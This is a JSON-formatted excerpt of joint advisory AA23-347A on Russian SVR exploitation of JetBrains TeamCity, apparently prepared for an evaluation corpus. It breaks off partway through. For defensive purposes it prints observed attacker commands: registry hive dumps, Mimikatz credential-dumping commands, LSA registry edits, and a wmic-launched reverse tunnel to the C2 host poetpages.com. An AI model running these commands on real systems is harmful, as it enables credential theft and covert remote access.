@@ -1,0 +1,530 @@
+[
+ {
+  "id": "p1",
+  "text": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA23-347A\n> - Date: 2023-12-13\n> - URL: https://www.ic3.gov/CSA/2023/231213.pdf\n> - PDF SHA-256: 60215ea9140ff6152ebb828bf1a3440604b38de5d4530138ceb95a81adcacc6a (`source.pdf`, 27 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (105 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                                                          Product ID: AA23-347A\n                                                                                                                            December 13, 2023"
+ },
+ {
+  "id": "p4",
+  "text": "Russian Foreign Intelligence Service (SVR)\n        Exploiting JetBrains TeamCity CVE Globally\n        SUMMARY\n        The US Federal Bureau of Investigation (FBI), US Cybersecurity & Infrastructure Security Agency\n        (CISA), US National Security Agency (NSA), Polish Military Counterintelligence Service (SKW),\n        CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian\n        Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT\n        29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 a at a\n        large scale, targeting servers hosting JetBrains TeamCity software since September 2023.\n        Software developers use TeamCity software to manage and automate software compilation, building,\n        testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors\n        with access to that software developer’s source code, signing certificates, and the ability to subvert\n        software compilation and deployment processes—access a malicious actor could further use to\n        conduct supply chain operations. Although the SVR used such access to compromise SolarWinds\n        and its customers in 2020, limited number and seemingly opportunistic types of victims currently\n        identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar\n        manner. The SVR has, however, been observed using the initial access gleaned by exploiting the\n        TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other\n        steps to ensure persistent and long-term access to the compromised network environments."
+ },
+ {
+  "id": "p5",
+  "text": "To bring Russia’s actions to public attention, the authoring agencies are providing information on the\n        SVR’s most recent compromise to aid organizations in conducting their own investigations and\n        securing their networks, provide compromised entities with actionable indicators of compromise\n        (IOCs),and empower private sector cybersecurity companies to better detect and counter the SVR’s\n        malicious actions. The authoring agencies recommend all organizations with affected systems that\n        did not immediately apply available patches or workarounds to assume compromise and initiate threat\n        hunting activities using the IOCs provided in this CSA. If potential compromise is detected,\n        administrators should apply the incident response recommendations included in this CSA and report\n        key findings to the FBI and CISA."
+ },
+ {
+  "id": "p6",
+  "text": "U.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory,\n        contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available,\n        please include the following information regarding the incident: date, time, and location of the incident; type of activity;\n        number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and\n        a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or\n        SOC@cisecurity.org).\n        This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries\n        minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to\n        standard copyright rules, TLP:CLEAR information may be distributed without restrictions. For more information on the Traffic\n        Light Protocol, see cisa.gov/tlp/."
+ },
+ {
+  "id": "p7",
+  "text": "THREAT OVERVIEW\n       SVR cyber operations pose a persistent threat to public and private organizations’ networks globally.\n       Since 2013, cybersecurity companies and governments have reported on SVR operations targeting\n       victim networks to steal confidential and proprietary information. A decade later, the authoring\n       agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of,\n       foreign intelligence, a broad concept that for Russia encompasses information on the politics,\n       economics, and military of foreign states; science and technology; and foreign counterintelligence.\n       The SVR also conducts cyber operations targeting technology companies that enable future cyber\n       operations.\n       A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spearphishing\n       operations, targeting government agencies, think tanks and policy analysis organizations, educational\n       institutions, and political organizations. This category of targeting is consistent with the SVR’s\n       responsibility to collect political intelligence, the collection of which has long been the SVR’s highest\n       priority. For the Russian Government, political intelligence includes not only the development and\n       execution of foreign policies, but also the development and execution of domestic policies and the\n       political processes that drive them. In December 2016, the U.S. Government published a Joint\n       Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the\n       SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of\n       spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily\n       targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report\n       describing tools and techniques used by the SVR to target embassies in dozens of countries.b\n       Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign\n       intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published\n       an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its\n       deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations\n       involved in COVID-19 vaccine development.c Although not listed in the 2020 advisory, the authoring\n       agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies.\n       Such biomedical and energy targets are consistent with the SVR’s responsibility to support the\n       Russian economy by pursuing two categories of foreign intelligence known as economic intelligence\n       and science and technology.\n       In April 2021, the U.S Government attributed a supply chain operation targeting the SolarWinds\n       information technology company and its customers to the SVR. This attribution marked the discovery\n       that the SVR had, since at least 2018, expanded the range of its cyber operations to include the\n       widespread targeting of information technology companies. At least some of this targeting was aimed\n       at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments\n       published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the\n       SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’\n       networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.d,e\n       In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably\n       continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a\n       software development program, the authoring agencies assess the SVR could benefit from access to"
+ },
+ {
+  "id": "p8",
+  "text": "victims, particularly by allowing the threat actors to compromise the networks of dozens of software\n       developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s\n       operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring\n       agencies assess the SVR has not yet used its accesses to software developers to access customer\n       networks and is likely still in the preparatory phase of its operation, having access to these\n       companies’ networks presents the SVR with opportunities to enable hard-to- detect command and\n       control (C2) infrastructure."
+ },
+ {
+  "id": "p9",
+  "text": "TECHNICAL DETAILS\n       Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE\n       ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE\n       ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE\n       ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping\n       and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also\n       adjusted to each operating environment and not all presented steps or actions below were executed\n       on every host.\n       Initial Access - Exploitation\n       The SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September\n       2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for\n       bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies’\n       observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high\n       privileges [T1203] granting the SVR an advantageous foothold in the network environment. The\n       authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity\n       currently being exploited by the SVR.\n       Host Reconnaissance\n       Initial observations show the SVR used the following basic, built-in commands to perform host\n       reconnaissance [T1033],[T1059.003],[T1592.002]:\n            ▪ whoami /priv\n           ▪    whoami /all\n           ▪    whoami /groups\n           ▪    whoami /domain\n           ▪    nltest -dclist\n           ▪    nltest -dsgetdc\n           ▪    tasklist\n           ▪    netstat\n           ▪    wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\"\" /password:\"\"<redacted>\"\" process list brief\n           ▪    wmic /node:\"\"<redacted>\"\" process list brief\n           ▪    wmic process get commandline -all\n           ▪    wmic process <proc_id> get commandline"
+ },
+ {
+  "id": "p10",
+  "text": "▪    wmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed\n           ▪    powershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties\n           ▪    powershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties.memberof\n           ▪    powershell Get-WmiObject -Class Win32_Service -Computername\n           ▪    powershell Get-WindowsDriver -Online -All"
+ },
+ {
+  "id": "p11",
+  "text": "File Exfiltration\n       Additionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may\n       provide insight into the host system’s operating system:\n           ▪    C:\\Windows\\system32\\ntoskrnl.exe [T1547] – to precisely identify system version, likely as a\n                prerequisite to deploy EDRSandBlast.\n           ▪    SQL Server executable files - based on the review of the post exploitation actions, the SVR\n                showed an interest in specific files of the SQL Server installed on the compromised systems:\n                ▪   C:\\Program Files\\Microsoft SQL\n                    Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll,\n                ▪   C:\\Program Files\\Microsoft SQL\n                    Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll,\n                ▪   C:\\Program Files\\Microsoft SQL\n                    Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll,\n                ▪   C:\\Program Files\\Microsoft SQL\n                    Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\n                ▪   C:\\Program Files\\Microsoft SQL\n                    Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\secforwarder.dll\n           ▪    Visual Studio files – based on the review of the post exploitation actions, the SVR showed an\n                interest in specific files of the Visual Studio:\n                ▪   C:\\Program Files (x86)\\Microsoft Visual\n                    Studio\\2017\\SQL\\Common7\\IDE\\VSIXAutoUpdate.exe\n            ▪ Update management agent files – based on the review of the post exploitation actions, the\n                SVR showed an interest in executables and configuration of patch management software:\n                         o   C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\\bin\\httpd.exe\n                         o   C:/Program Files (x86)/PatchManagementInstallation/Agent/12/Httpd\n                         o   C:/ProgramData/GFI/LanGuard 12/HttpdConfig/httpd.conf"
+ },
+ {
+  "id": "p12",
+  "text": "Interest in SQL Server"
+ },
+ {
+  "id": "p13",
+  "text": "Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server\n       [T1059.001],[T1505.001]:\n             ▪    powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL\n                  Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\",\"C:\\Program Files\\Microsoft SQL\n                  Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll\",\"C:\\Program Files\\Microsoft SQL\n                  Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll\",\"C:\\Program Files\\Microsoft SQL\n                  Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\" -DestinationPath\n                  C:\\Windows\\temp\\1\\sql.zip\n             ▪    SVR cyber actors also exfiltrated secforwarder.dll"
+ },
+ {
+  "id": "p14",
+  "text": "Tactics Used to Avoid Detection\n       To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable\n       or outright kill endpoint detection and response (EDR) and antivirus (AV) software. [T1562.001]\n       This was done using an open source project called “EDRSandBlast.”f,g The authoring agencies have\n       observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is\n       used for controlling and protecting running processes and protecting them from infection. The actors\n       then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally,\n       executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].\n       In several cases SVR attempted to hide their backdoors via:\n              ▪   Abusing a DLL hijacking vulnerability in Zabbixh software by replacing a legitimate Zabbix\n                  DLL with their one containing GraphicalProton backdoor,\n              ▪   Backdooring an open source application developed by Microsoft named vcperfi. SVR\n                  modified and copied publicly available source code. After execution, backdoored vcperf\n                  dropped several DLLs to disc, one of those being a GraphicalProton backdoor,\n              ▪   Abusing a DLL hijacking vulnerability in Webrootj antivirus software by replacing a legitimate\n                  DLL with one containing GraphicalProton backdoor."
+ },
+ {
+  "id": "p15",
+  "text": "To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft\n       OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware\n       via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated\n       below:"
+ },
+ {
+  "id": "p16",
+  "text": "g\n           Please see Appendix A for a list of commands used by the SVR to avoid detection."
+ },
+ {
+  "id": "p17",
+  "text": "Privilege escalation\n       To facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS,k\n       NoLmHash registry key modification, and the Mimikatz tool.\n       The SVR modified the NoLMHash registry using the following reg command:\n           ▪    reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLmHash /t\n                REG_DWORD /d \"0\" /f"
+ },
+ {
+  "id": "p18",
+  "text": "The SVR used the following Mimikatz commands [T1003]:\n           ▪    privilege::debug\n           ▪    lsadump::cache\n           ▪    lsadump::secrets\n           ▪    lsadump::sam\n           ▪    sekurlsa::logonpasswords"
+ },
+ {
+  "id": "p19",
+  "text": "Persistence\n       The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors.\n       Depending on the privileges the SVR had, their executables were stored in one of following\n       directories:\n            ▪   C:\\Windows\\temp\n            ▪   C:\\Windows\\System32\n            ▪   C:\\Windows\\WinStore"
+ },
+ {
+  "id": "p20",
+  "text": "The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of\n       arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of\n       Compromise.\n       To secure long-term access to the environment, the SVR used the Rubeusl toolkit to craft Ticket\n       Granting Tickets (TGTs) [T1558.001]."
+ },
+ {
+  "id": "p21",
+  "text": "Sensitive Data Exfiltration [T1020]"
+ },
+ {
+  "id": "p22",
+  "text": "The SVR exfiltrated the following Windows Registry hives from its victims [T1003]:\n           ▪    HKLM\\SYSTEM\n           ▪    HKLM\\SAM\n           ▪    HKLM\\SECURITY"
+ },
+ {
+  "id": "p23",
+  "text": "In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and\n       then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and\n       SECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\\n       directory.\n           ▪    reg save HKLM\\SYSTEM \"\"C:\\Windows\\temp\\1\\sy.sa\"\" /y\n           ▪    reg save HKLM\\SAM \"\"C:\\Windows\\temp\\1\\sam.sa\"\" /y\n           ▪    reg save HKLM\\SECURITY \"\"C:\\Windows\\temp\\1\\se.sa\"\" /y\n           ▪    powershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath\n                C:\\Windows\\temp\\s.zip -Force & del C:\\Windows\\temp\\1 /F /Q"
+ },
+ {
+  "id": "p24",
+  "text": "In a few specific cases, the SVR used the SharpChromiumm tool to obtain sensitive browser data\n       such as session cookies, browsing history, or saved logins.\n       SVR also used DSInternals open source tool to interact with Directory Services. DSInternalsn allows\n       to obtain a sensitive Domain information."
+ },
+ {
+  "id": "p25",
+  "text": "Network Reconnaissance\n       After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then\n       focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using\n       a mix of built-in commands and additional tools, such as port scanner and PowerSploit,o which it\n       launched into memory [T1046]. The SVR executed the following PowerSploit commands:\n           ▪    Get-NetComputer\n           ▪    Get-NetGroup\n           ▪    Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description,\n                pwdlastset, logoncount, badpwdcount\"\n           ▪    Get-NetDiDomain\n           ▪    Get-AdUser\n           ▪    Get-DomainUser -UserName\n           ▪    Get-NetUser -PreauthNotRequire"
+ },
+ {
+  "id": "p26",
+  "text": "▪    Get-NetComputer | select samaccountname\n           ▪    Get-NetUser -SPN | select serviceprincipalname"
+ },
+ {
+  "id": "p27",
+  "text": "Tunneling into Compromised Environments\n       In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source\n       reverse socks tunneler named Rsockstunp—to establish a tunnel to the C2 infrastructure [T1572].\n       The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:\n           ▪    65.20.97.203:443\n           ▪    poetpages.com:8443"
+ },
+ {
+  "id": "p28",
+  "text": "The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation\n       Command Line (WMIC) [T1047] utility after dropping it to disk:\n           ▪    wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat\n                Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\""
+ },
+ {
+  "id": "p29",
+  "text": "Lateral Movement\n       The SVR used WMIC to facilitate lateral movement [T1047],[T1210].\n           ▪    wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create\n                \"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\""
+ },
+ {
+  "id": "p30",
+  "text": "The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].\n       It modified Registry using the following reg command:\n           ▪    reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v\n                DisableRestrictedAdmin /t REG_DWORD /d \"0\" /f"
+ },
+ {
+  "id": "p31",
+  "text": "Adversary Toolset\n       In the course of the TeamCity operation, the SVR used multiple custom and open source available\n       tools and backdoors. The following custom tools were observed in use during the operation:\n           ▪    GraphicalProtonq– is a simplistic backdoor that uses OneDrive, Dropbox, and randomly\n                generated BMPs [T1027.001] to exchange data with the SVR operator.\n           ▪    After execution, GraphicalProton gathers environment information such as active TCP/UDP\n                connections [T1049], running processes [T1049], as well as user, host, and domain names\n                [T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a\n                backup channel [T1567]. API keys are hardcoded into the malware. When communicating with\n                cloud services, GraphicalProton generates a randomly named directory which is used to store\n                infection-specific BMP files - with both commands and results [T1564.001]. Directory name is\n                re-randomized each time the GraphicalProton process is started.\n           ▪    BMP files that were used to exchange data were generated in the following way:\n                    1. Compress data using zlib,\n                    2. Encrypt data using custom algorithm,\n                    3. Add “***” string literal to encrypted data,\n                    4. Create a random BMP with random rectangle,\n                    5. And finally, encode encrypted data within lower pixel bits."
+ },
+ {
+  "id": "p32",
+  "text": "While the GraphicalProton backdoor has remained mostly unchanged over the months we have been\n       tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation,\n       encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are\n       especially noteworthy – a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start\n       execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself\n       within vcperf,r [T1036] an open-source C++ build analysis tool from Microsoft.\n           ▪    GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced\n                by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on\n                HTTP request.\n                To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy\n                WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files –\n                stager and encrypted binary file that contains further code."
+ },
+ {
+  "id": "p33",
+  "text": "MITRE ATT&CK TACTICS AND TECHNIQUES\n       See below tables for all referenced threat actor tactics and techniques in this advisory. For additional\n       mitigations, see the Mitigations section."
+ },
+ {
+  "id": "p34",
+  "text": "Table 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance"
+ },
+ {
+  "id": "p35",
+  "text": "Technique Title                         ID                            Use"
+ },
+ {
+  "id": "p36",
+  "text": "Gather Victim Network                       T1046              SVR cyber actors may gather\n           Information: Network Topology                                  information about the victim’s\n                                                                          network topology that can be used\n                                                                          during targeting."
+ },
+ {
+  "id": "p37",
+  "text": "Gather Victim Host Information:           T1592.002            SVR cyber actors may gather\n           Software                                                       information about the victim’s host\n                                                                          networks that can be used during\n                                                                          targeting."
+ },
+ {
+  "id": "p38",
+  "text": "Table 2: SVR Cyber ACTORS’ ATT&CK TECHNIQUES FOR ENTERPRISE – INITIAL ACCESS"
+ },
+ {
+  "id": "p39",
+  "text": "Technique Title                         ID                            Use"
+ },
+ {
+  "id": "p40",
+  "text": "Exploit Public-Facing Application         T1190                SVR cyber actors exploit internet-\n                                                                          connected JetBrains TeamCity server\n                                                                          using CVE-2023-42793 for initial\n                                                                          access."
+ },
+ {
+  "id": "p41",
+  "text": "Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution"
+ },
+ {
+  "id": "p42",
+  "text": "Techniqu           ID                                             Use\n         e Title"
+ },
+ {
+  "id": "p43",
+  "text": "Comman         T1059.0          SVR cyber actors used powershell commands to compress Microsoft SQL\n        d and          01               server .dll files.\n        Scripting\n        Interprete\n        r:\n        PowerSh\n        ell"
+ },
+ {
+  "id": "p44",
+  "text": "Comman         T1059.0          SVR cyber actors execute these powershell commands to perform host\n        d and          03               reconnaissance:\n        Scripting                         • powershell\n        Interprete                           ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Propertie\n        r:                                   s\n        Windows                           • powershell\n        Comman                               ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Propertie\n        d Shell                              s.memberof\n                                          • powershell Get-WmiObject -Class Win32_Service -Computername\n                                          • powershell Get-WindowsDriver -Online -All"
+ },
+ {
+  "id": "p45",
+  "text": "Exploitati     T1203            SVR cyber actors leverage arbitrary code execution after exploiting CVE-\n        on for                          2023-42793.\n        Client\n        Execution"
+ },
+ {
+  "id": "p46",
+  "text": "Hijack    T1574.00 SVR cyber actors use a variant of GraphicalProton that uses DLL\n        Execution 2        hijacking in Zabbix as a means to start execution.\n        Flow: DLL\n        Side-\n        Loading"
+ },
+ {
+  "id": "p47",
+  "text": "Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence"
+ },
+ {
+  "id": "p48",
+  "text": "Technique Title                          ID                            Use"
+ },
+ {
+  "id": "p49",
+  "text": "Scheduled Task                            T1053.005            SVR cyber actors may abuse\n                                                                          Windows Task Schedule to perform\n                                                                          task scheduling for initial or recurring\n                                                                          execution of malicious code."
+ },
+ {
+  "id": "p50",
+  "text": "Server Software Component:                T1505.001            SVR cyber actors abuse SQL server\n           SQL Stored Procedures                                          stored procedures to maintain\n                                                                          persistence."
+ },
+ {
+  "id": "p51",
+  "text": "Boot or Logon Autostart                   T1547                SVR cyber actors used\n           Execution                                                      C:\\Windows\\system32\\ntoskrnl.exe\n                                                                          to configure automatic system boot\n                                                                          settings to maintain persistence."
+ },
+ {
+  "id": "p52",
+  "text": "Table 5: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Privilege Escalation"
+ },
+ {
+  "id": "p53",
+  "text": "Technique Title                          ID                            Use"
+ },
+ {
+  "id": "p54",
+  "text": "Exploitation for Privilege                T1068                SVR cyber actors exploit JetBrains\n           Escalation                                                     TeamCity vulnerability to achieve\n                                                                          escalated privileges.\n                                                                          To avoid detection, the SVR cyber\n                                                                          actors used a “Bring Your Own\n                                                                          Vulnerable Driver” technique to\n                                                                          disable EDR and AV defense\n                                                                          mechanisms."
+ },
+ {
+  "id": "p55",
+  "text": "Account Manipulation                      T1098                SVR cyber actors may manipulate\n                                                                          accounts to maintain and/or elevate\n                                                                          access to victim systems."
+ },
+ {
+  "id": "p56",
+  "text": "Table 6: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Defense Evasion"
+ },
+ {
+  "id": "p57",
+  "text": "Technique Title                     ID                            Use"
+ },
+ {
+  "id": "p58",
+  "text": "Obfuscated Files or Information:      T1027.001            SVR cyber actors use BMPs to\n           Binary Padding                                             perform binary padding while\n                                                                      exchange data is exfiltrated to an\n                                                                      their C2 station."
+ },
+ {
+  "id": "p59",
+  "text": "Masquerading                          T1036                SVR cyber actors use a variant that\n                                                                      uses DLL hijacking in Zabbix as a\n                                                                      means to start execution (and\n                                                                      potentially provide long-term, hard-to-\n                                                                      detect access) and a variant that\n                                                                      masks itself within vcperf,p an open-\n                                                                      source C++ build analysis tool from\n                                                                      Microsoft."
+ },
+ {
+  "id": "p60",
+  "text": "Process Injection                     T1055                SVR cyber actors inject code into AV\n                                                                      and EDR processes to evade\n                                                                      defenses."
+ },
+ {
+  "id": "p61",
+  "text": "Disable or Modify Tools               T1562.001            SVR cyber actors may modify and/or\n                                                                      disable tools to avoid possible\n                                                                      detection of their malware/tools and\n                                                                      activities."
+ },
+ {
+  "id": "p62",
+  "text": "Hide Artifacts                        T1564                SVR cyber actors may attempt to\n                                                                      hide artifacts associated with their\n                                                                      behaviors to evade detection."
+ },
+ {
+  "id": "p63",
+  "text": "Hide Artifacts: Hidden Files and      T1564.001            When communicating with cloud\n           Directories                                                services, GraphicalProton generates\n                                                                      a randomly named directory which is\n                                                                      used to store infection-specific BMP\n                                                                      files - with both commands and\n                                                                      results."
+ },
+ {
+  "id": "p64",
+  "text": "Table 7: SVR Cyber actors’ ATT&CK Techniques for Enterprise: Credential Access"
+ },
+ {
+  "id": "p65",
+  "text": "Technique Title                     ID                            Use"
+ },
+ {
+  "id": "p66",
+  "text": "OS Credential Dumping: LSASS          T1003.001            SVR cyber actors executed Mimikatz\n           Memory                                                     commands in memory to gain access\n                                                                      to credentials stored in memory."
+ },
+ {
+  "id": "p67",
+  "text": "OS Credential Dumping: Security T1003.002                    SVR cyber actors used:\n           Account Manager\n                                                                          •   privilege::debug\n                                                                          •   lsadump::cache\n                                                                          •   lsadump::secrets\n                                                                          •   lsadump::sam\n                                                                          •   sekurlsa::logonpasswords"
+ },
+ {
+  "id": "p68",
+  "text": "Mimikatz commands to gain access\n                                                                       to credentials.\n                                                                       Additionally, SVR cyber actors\n                                                                       exfiltrated Windows registry hives to\n                                                                       steal credentials.\n                                                                        • HKLM\\SYSTEM\n                                                                        • HKLM\\SAM\n                                                                       HKLM\\SECURITY"
+ },
+ {
+  "id": "p69",
+  "text": "Credentials from Password             T1555.003             In a few specific cases, the SVR\n           Stores: Credentials from Web                                used the SharpChromium tool to\n           Browsers                                                    obtain sensitive browser data such as\n                                                                       session cookies, browsing history, or\n                                                                       saved logins"
+ },
+ {
+  "id": "p70",
+  "text": "Steal or Forge Kerberos Tickets:      T1558.001             To secure long-term access to the\n           Golden Ticket                                               environment, the SVR used the\n                                                                       Rubeus toolkit to craft Ticket\n                                                                       Granting Tickets (TGTs)"
+ },
+ {
+  "id": "p71",
+  "text": "Table 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery"
+ },
+ {
+  "id": "p72",
+  "text": "Technique Title                      ID                            Use"
+ },
+ {
+  "id": "p73",
+  "text": "System Owner/User Discovery           T1033                 SVR cyber actors use these built-in\n                                                                       commands to perform host\n                                                                       reconnaissance: whoami /priv,\n                                                                       whoami / all, whoami / groups,\n                                                                       whoami / domain to perform user\n                                                                       discovery."
+ },
+ {
+  "id": "p74",
+  "text": "Process Discovery                    T1057                SVR cyber actors use\n                                                                     GraphicalProton to gather running\n                                                                     processes data."
+ },
+ {
+  "id": "p75",
+  "text": "Gather Victim Network                T1590                SVR cyber actors use\n           Information                                               GraphicalProton to gather victim\n                                                                     network information."
+ },
+ {
+  "id": "p76",
+  "text": "Table 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement"
+ },
+ {
+  "id": "p77",
+  "text": "Technique Title                    ID                           Use"
+ },
+ {
+  "id": "p78",
+  "text": "Exploitation of Remote Services      T1210                SVR cyber actors may exploit remote\n                                                                     services to gain unauthorized access\n                                                                     to internal systems once inside a\n                                                                     network."
+ },
+ {
+  "id": "p79",
+  "text": "Windows Management                   T1047                 SVR cyber actors executed\n           Instrumentation                                            Rsockstun either in memory or\n                                                                      using Windows Management\n                                                                      Instrumentation (WMI) to execute\n                                                                      malicious commands and\n                                                                      payloads.\n                                                                      wmic process call create\n                                                                      \"C:\\Program Files\\Windows\n                                                                      Defender Advanced Threat\n                                                                      Protection\\Sense.exe -connect\n                                                                      poetpages.com -pass M554-\n                                                                      0sddsf2@34232fsl45t31\""
+ },
+ {
+  "id": "p80",
+  "text": "Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control"
+ },
+ {
+  "id": "p81",
+  "text": "Technique Title                      ID                             Use"
+ },
+ {
+  "id": "p82",
+  "text": "Dynamic Resolution                    T1568                 SVR may dynamically establish\n                                                                       connections to command-and-control\n                                                                       infrastructure to evade common\n                                                                       detections and remediations."
+ },
+ {
+  "id": "p83",
+  "text": "Protocol Tunneling                    Protocol Tunneling     SVR cyber actors may tunnel\n                                                                        network communications to and\n                                                                        from a victim system within a\n                                                                        separate protocol to avoid\n                                                                        detection/network filtering and/or\n                                                                        enable access to otherwise\n                                                                        unreachable systems.\n                                                                        In selected environments, the SVR\n                                                                        used an additional tool named,\n                                                                        “rr.exe”—a modified open source\n                                                                        reverse socks tunneler named\n                                                                        Rsockstunm—to establish a tunnel\n                                                                        to the C2 infrastructure"
+ },
+ {
+  "id": "p84",
+  "text": "Table 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration"
+ },
+ {
+  "id": "p85",
+  "text": "Technique Title                      ID                             Use"
+ },
+ {
+  "id": "p86",
+  "text": "Automated Exfiltration                T1020                 SVR cyber actors may exfiltrate data,\n                                                                       such as sensitive documents,\n                                                                       through the use of automated\n                                                                       processing after being gathered\n                                                                       during collection."
+ },
+ {
+  "id": "p87",
